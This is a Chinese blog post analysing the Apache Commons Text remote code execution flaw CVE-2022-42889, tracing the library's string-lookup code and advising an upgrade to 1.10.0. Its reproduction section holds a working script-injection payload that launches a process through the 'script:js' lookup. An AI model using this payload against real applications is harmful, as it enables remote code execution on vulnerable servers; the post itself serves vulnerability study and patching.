---
title: Apache Commons Text远程代码执行漏洞(CVE-2022-42889)分析 - admin-神风
url: https://www.cnblogs.com/wh4am1/p/16795499.html
source: 博客园 - admin-神风
date: 2022-10-16
fetch_date: 2025-10-03T20:02:13.011352
---

# Apache Commons Text远程代码执行漏洞(CVE-2022-42889)分析 - admin-神风

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/wh4am1/)

# [admin-神风](https://www.cnblogs.com/wh4am1)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/wh4am1/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/admin-%E7%A5%9E%E9%A3%8E)
* 订阅
* [管理](https://i.cnblogs.com/)

# [Apache Commons Text远程代码执行漏洞(CVE-2022-42889)分析](https://www.cnblogs.com/wh4am1/p/16795499.html "发布于 2022-10-16 00:55")

### 漏洞介绍

根据apache官方给出的说明介绍到Apache Commons Text执行变量插值，允许动态评估和扩展属性的一款工具包，插值的标准格式是"${prefix:name}"，其中"prefix"是用于定位org.apache.commons.text.lookup类，执行插值的是StringLookup接口，接口中定义了lookup方法。在1.5到1.9的版本中，默认的Lookup实例集包括可以导致任意代码执行的表达式，如javax.script、dns、url等加载方式。

### 影响范围

1.5 <= Apache Commons Text <= 1.9

### 组件使用介绍

Apache Commons Text组件通常在开发过程中用于占位符和动态获取属性的字符串编辑工具包，这里我搞了个Demo来简单介绍下使用方法：

```
import org.apache.commons.text.StringSubstitutor;

class Demo{
    public static void main(String[] args){
        String resolvedString = StringSubstitutor
                 .replaceSystemProperties("You are running with java.version = ${java.version} and os.name = ${os.name}.");

        System.out.println(resolvedString);

        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        interpolator.setEnableSubstitutionInVariables(true); // Allows for nested $'s.
        final String text = interpolator.replace("Base64 Decoder:${base64Decoder:SGVsbG9Xb3JsZCE=}\n"
            + "Date:                  ${date:yyyy-MM-dd}\n" + "DNS:                   ${dns:address|apache.org}\n"
            + "Environment Variable:  ${env:USERNAME}\n"
            + "Script:                ${script:javascript:3 + 4}\n" + "System Property:       ${sys:user.dir}\n");
        System.out.println(text);
    }
}
```

![](https://img2022.cnblogs.com/blog/1124287/202210/1124287-20221016004823449-943770537.png)

因此该组件常用于数据库查询前的语句替换，或者页面输出的时候替换。

### 漏洞复现

```
import org.apache.commons.text.StringSubstitutor;

class Demo{
    public static void main(String[] args){
        StringSubstitutor stringSubstitutorInterpolator = StringSubstitutor.createInterpolator();
        String payload = "${script:js:new java.lang.ProcessBuilder(\"calc\").start()}";
        stringSubstitutorInterpolator.replace(payload);
    }
}
```

![](https://img2022.cnblogs.com/blog/1124287/202210/1124287-20221016005051018-1447750157.png)

### 代码分析

先从StringSubstitutor.replace方法中跟入

```
public String replace(final String source) {
    if (source == null) {
        return null;
    }
    final TextStringBuilder buf = new TextStringBuilder(source);
    if (!substitute(buf, 0, source.length())) {
        return source;
    }
    return buf.toString();
}
```

调用了substitute解析传入的字符串

![](https://img2022.cnblogs.com/blog/1124287/202210/1124287-20221016005140838-1679442399.png)

方法中解析了头部和尾部的${}，把其中的值取出来进一步解析

```
protected String resolveVariable(final String variableName, final TextStringBuilder buf, final int startPos,
                                 final int endPos) {
    final StringLookup resolver = getStringLookup();
    if (resolver == null) {
        return null;
    }
    return resolver.lookup(variableName);
}
```

这里获取的StringLookup就是之前使用StringSubstitutor.createInterpolator()创建实例化对象的地方

```
public static StringSubstitutor createInterpolator() {
    return new StringSubstitutor(StringLookupFactory.INSTANCE.interpolatorStringLookup());
}
```

并在构造方法中调用了this.setVariableResolver(variableResolver)设置VariableResolver为InterpolatorStringLookup类，之后继续跟入InterpolatorStringLookup的lookup方法中。

```
@Override
public String lookup(String var) {        //var="script:js:new java.lang.ProcessBuilder("calc").start()"
    if (var == null) {
        return null;
    }

    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
    if (prefixPos >= 0) {
        final String prefix = toKey(var.substring(0, prefixPos));
        final String name = var.substring(prefixPos + 1);
        final StringLookup lookup = stringLookupMap.get(prefix);
        String value = null;
        if (lookup != null) {
            value = lookup.lookup(name);
        }

        if (value != null) {
            return value;
        }
        var = var.substring(prefixPos + 1);
    }
    if (defaultStringLookup != null) {
        return defaultStringLookup.lookup(var);
    }
    return null;
}
```

方法截取了":"前面的script关键词，并以此为索引获取对应的StringLookup对象

![](https://img2022.cnblogs.com/blog/1124287/202210/1124287-20221016005320902-889897159.png)

可以看到系统支持的类型有18种操作方式

并在后续调用了ScriptStringLookup.lookup方法

```
@Override
public String lookup(final String key) {
    if (key == null) {
        return null;
    }
    final String[] keys = key.split(SPLIT_STR, 2);
    final int keyLen = keys.length;
    if (keyLen != 2) {
        throw IllegalArgumentExceptions.format("Bad script key format [%s]; expected format is EngineName:Script.",
                                               key);
    }
    final String engineName = keys[0];
    final String script = keys[1];
    try {
        final ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName(engineName);
        if (scriptEngine == null) {
            throw new IllegalArgumentException("No script engine named " + engineName);
        }
        return Objects.toString(scriptEngine.eval(script), null);
    } catch (final Exception e) {
        throw IllegalArgumentExceptions.format(e, "Error in script engine [%s] evaluating script [%s].", engineName,
                                               script);
    }
}
```

之后的代码就是获取js脚本引擎，并通过ScriptEngine.eval的方法执行

![](https://img2022.cnblogs.com/blog/1124287/202210/1124287-20221016005410869-594712728.png)

关于这个引擎的使用和介绍可以看这篇文章：<https://www.qieseo.com/329754.html>

Nashorn扩展可以使JVM在运行时动态调用JavaScript脚本的能力，大大提升了开发时的灵活机动性。

![](https://img2022.cnblogs.com/blog/1124287/202210/1124287-20221016005439647-244665392.png)

### 修复建议

升级版本到Apache Commons Text 1.10.0版本。

![](https://img2022.cnblogs.com/blog/1124287/202210/1124287-20221016005511136-1850677485.png)

可以看到在1.10.0版本中是删掉了script的功能的，但是还是存在有xml和file等功能类可以深入研究下。

### Reference

[1].<https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om>

[2].<https://github.com/apache/commons-text/commit/b9b40b903e2d1f9935039803c9852439576780ea>

[3].<https://commons.apache.org/proper/commons-text/javadocs/api-release/org/apache/commons/text/StringSubstitutor.html>

[4].<https://www.qieseo.com/329754.html>

[5].<https://github.com/naumanshah03/apache-commons-text-rce/blob/5ea6611e6d74da3274bebca1d64fd5c2de01f09a/src/main/java/org/nauman/Main.java>

posted @
2022-10-16 00:55
[admin-神风](https://www.cnblogs.com/wh4am1)
阅读(6080)
评论(0)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblo...